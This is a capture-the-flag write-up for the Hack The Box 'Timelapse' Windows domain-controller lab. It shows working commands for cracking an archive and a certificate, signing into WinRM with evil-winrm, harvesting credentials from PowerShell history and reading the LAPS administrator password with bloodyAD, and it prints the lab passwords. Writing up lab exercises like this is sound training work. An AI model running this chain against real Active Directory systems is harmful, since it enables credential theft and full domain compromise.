---
title: Timelapse
date: 2026-09-05
description: Easy Windows AD box cracking a zipped WinRM backup to a PFX certificate, signing into SSL WinRM with it, lifting credentials from PowerShell history, and reading the LAPS password with bloodyAD.
tags:
  - htb
  - Easy
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Sat Sep  5 10:32:33 2026 as: /usr/lib/nmap/nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49693,58831 -A -oN scan_results.txt 10.129.227.113
Nmap scan report for timelapse.htb (10.129.227.113)
Host is up (0.69s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-09-05 22:39:02Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/wsmans?
|_ssl-date: 2026-09-05T22:42:24+00:00; +8h06m18s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  msrpc             Microsoft Windows RPC
58831/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (91%), Microsoft Windows 10 1903 - 21H1 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-05T22:41:47
|_  start_date: N/A
|_clock-skew: mean: 8h06m18s, deviation: 0s, median: 8h06m17s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   751.07 ms 10.10.16.1
2   751.21 ms timelapse.htb (10.129.227.113)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep  5 10:36:28 2026 -- 1 IP address (1 host up) scanned in 235.52 seconds
```

- ldap anonymous bind -> No
- SMB works as **guest user** -> shares & rids

- `winrm_backup` zip is password protected -> `zip2john` -> `pkzip` (tells you the encryption used on the data)

> `supremelegacy`

- `legacyydevauth.pfx` extracts from the zip, and the pfx is password protected too -> `pfx2john` -> crack as `pfx`

> `thuglegacy`

The pfx key holds the **Private_key** and **Public_key** (certificate).

# User

- WinRM runs on port 5986 **with SSL**
- Usually WinRM is 5985 => no SSL configured

Login through `evil-winrm` using the private & public key.

### Key extraction from pfx file using openssl

- Private key extraction

```sh
openssl pkcs12 -in legacyy_dev_auth.pfx -out key.pem -nodes -nocerts
```

- Public key extraction

```sh
openssl pkcs12 -in legacyy_dev_auth.pfx -out cert.pem -nokeys
```

```sh
evil-winrm -i 10.129.227.113 -c cert.pem -k key.pem -S
```

`-S` -> **evil-winrm** connects to the SSL configured port (winrms/ssl)

Gained shell as `legacyy`

Same as the `.bash_history` file, **powershell** keeps a **history file** too:

> Reference : https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html

default path to the file:

```txt
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

if altered we can view it using `Get-PSReadlineOption`:

```powershell
cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine

type ConsoleHost_history.txt
```

Got the username and password of an AD user:

> `svc_deploy - E3R$Q62^12p7PLlC%KWaxuaV`

# Root

Run bloodhound-python to collect the AD structure — reviewing it surfaced a privesc:

`svc_deploy` is a member of group **LAPS_READERS**, which can **read the password** set by Local Administrator Password Solution (LAPS) on the computer **DC01.TIMELAPSE.HTB**.

---
For systems using **legacy LAPS**, the following AD computer object properties are relevant:
- **ms-Mcs-AdmPwd**: The plaintext LAPS password
- **ms-Mcs-AdmPwdExpirationTime**: The LAPS password expiration time
---

Looks like bloodyAD can be used to abuse it:

```sh
bloodyAD --host 10.129.227.113 -d dc01.timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

> `Administrator - jF21lrd@9ayov6S$/29hD02[`

```sh
evil-winrm -i 10.129.227.113 -u administrator -p 'jF21lrd@9ayov6S$/29hD02' -S
```

The root flag is under the user **TRX**

Gained `root`
